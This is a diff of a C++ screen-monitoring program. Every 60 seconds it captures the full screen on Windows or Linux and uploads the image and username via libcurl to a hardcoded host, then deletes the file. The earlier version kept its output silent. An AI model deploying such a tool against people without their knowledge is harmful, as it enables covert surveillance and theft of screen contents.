@@ -7,12 +7,12 @@
 #include <sstream>
 #include <vector>
 #include <curl/curl.h>
-#include <cstdio> // для remove и fopen
 
 #ifdef _WIN32
     #include <windows.h>
     #include <lmcons.h>
     #include <gdiplus.h>
+
     using namespace Gdiplus;
 #else
     #include <unistd.h>
@@ -22,7 +22,7 @@
 
 using namespace std;
 
-// --- Вспомогательные функции (без изменений) ---
+
 string get_username() {
 #ifdef _WIN32
     char username[UNLEN + 1];
@@ -31,6 +31,7 @@ string get_username() {
     return "unknown_win";
 #else
     struct passwd *pw = getpwuid(getuid());
+    // pw_gecos ??
     return pw ? pw->pw_name : "unknown_linux"; 
 #endif
 }
@@ -43,14 +44,16 @@ string get_timestamp() {
     return ss.str();
 }
 
-// --- Windows GDI+ ---
 #ifdef _WIN32
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
-    UINT  num = 0; UINT  size = 0;
+    UINT  num = 0;
+    UINT  size = 0;
     GetImageEncodersSize(&num, &size);
     if (size == 0) return -1;
+
     ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
     if (pImageCodecInfo == NULL) return -1;
+
     GetImageEncoders(num, size, pImageCodecInfo);
     for (UINT j = 0; j < num; ++j) {
         if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
@@ -78,41 +81,47 @@ bool take_windows_screenshot(const string& filename_utf8) {
     HDC hdcMem = CreateCompatibleDC(hdcScreen);
     HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
     HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);
+    
     BitBlt(hdcMem, 0, 0, width, height, hdcScreen, left, top, SRCCOPY);
 
     Bitmap bitmap(hBitmap, NULL);
     CLSID clsid;
-    bool success = false;
     if (GetEncoderClsid(L"image/png", &clsid) > -1) {
-        if (bitmap.Save(&wfilename[0], &clsid, NULL) == Ok) success = true;
+        bitmap.Save(&wfilename[0], &clsid, NULL);
     }
 
     SelectObject(hdcMem, hOld);
     DeleteObject(hBitmap);
     DeleteDC(hdcMem);
     ReleaseDC(NULL, hdcScreen);
-    return success;
+
+    return true; 
 }
 #endif
 
-// --- Linux Команды ---
+
 #ifndef _WIN32
-string get_linux_screenshot_command(const string& filename) {
-    const char* session_env = getenv("XDG_SESSION_TYPE");
-    string session = (session_env) ? session_env : "x11"; 
-    const char* desktop_env = getenv("XDG_CURRENT_DESKTOP");
-    string desktop = (desktop_env) ? desktop_env : "";
-
-    if (session == "wayland") {
-        if (desktop.find("KDE") != string::npos) return "spectacle -b -n -o " + filename;
-        if (desktop.find("GNOME") != string::npos) return "gnome-screenshot -f " + filename;
-        return "grim " + filename; 
-    } 
-    return "scrot -z " + filename;
+std::string get_linux_screenshot_command(const std::string& filename) {
+    if (std::system("which import > /dev/null 2>&1") == 0) {
+        return "import -window root \"" + filename + "\"";
+    }
+    else if (std::system("which gnome-screenshot > /dev/null 2>&1") == 0) {
+        return "gnome-screenshot -f \"" + filename + "\"";
+    }
+    else if (std::system("which scrot > /dev/null 2>&1") == 0) {
+        return "scrot \"" + filename + "\"";
+    }
+    else if (std::system("which maim > /dev/null 2>&1") == 0) {
+        return "maim \"" + filename + "\"";
+    }
+    else {
+        return "xwd -root -out \"" + filename + ".xwd\" && "
+               "convert \"" + filename + ".xwd\" \"" + filename + "\" && "
+               "rm \"" + filename + ".xwd\"";
+    }
 }
 #endif
 
-// --- Отправка ---
 void send_file(string filename, string user) {
     CURL *curl = curl_easy_init();
     if(curl) {
@@ -126,17 +135,13 @@ void send_file(string filename, string user) {
         curl_mime_name(field, "user");
         curl_mime_data(field, user.c_str(), CURL_ZERO_TERMINATED);
 
+        // TODO: Вынести IP в конфиг
         curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.31.173:5000/upload");
         curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
 
-        // Отключаем вывод прогресса curl в консоль
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, NULL); 
-        
         CURLcode res = curl_easy_perform(curl);
-        
-        // Логируем ТОЛЬКО ошибки
         if(res != CURLE_OK) {
-            cerr << "[ERROR] Send failed: " << curl_easy_strerror(res) << endl;
+            cerr << "Curl Error: " << curl_easy_strerror(res) << endl;
         }
             
         curl_easy_cleanup(curl);
@@ -162,12 +167,12 @@ void run_monitor() {
         char tempPath[MAX_PATH];
         GetTempPathA(MAX_PATH, tempPath);
         filename = string(tempPath) + "scr_" + get_timestamp() + ".png";
+        
         screenshot_taken = take_windows_screenshot(filename);
         #else
         filename = "/tmp/scr_" + get_timestamp() + ".png";
         string cmd = get_linux_screenshot_command(filename);
-        // Заглушаем вывод системных команд (> /dev/null 2>&1)
-        if (!cmd.empty() && system((cmd + " > /dev/null 2>&1").c_str()) == 0) {
+        if (!cmd.empty() && system(cmd.c_str()) == 0) {
             screenshot_taken = true;
         }
         #endif
@@ -178,14 +183,12 @@ void run_monitor() {
                 fclose(f);
                 send_file(filename, user);
                 remove(filename.c_str());
-                // УСПЕХ - молчим
+                cout << "Screenshot sent for user: " << user << endl;
             } else {
-                cerr << "[ERROR] File created but not readable: " << filename << endl;
+                cerr << "Error: Screenshot file created but not readable." << endl;
             }
         } else {
-            // Не удалось сделать скриншот (может экран заблокирован),
-            // можно закомментировать, если это спамит при заблокированном ПК
-            cerr << "[WARN] Failed to take screenshot (Screen locked?)" << endl;
+            cerr << "Failed to take screenshot." << endl;
         }
         
         this_thread::sleep_for(chrono::seconds(60));
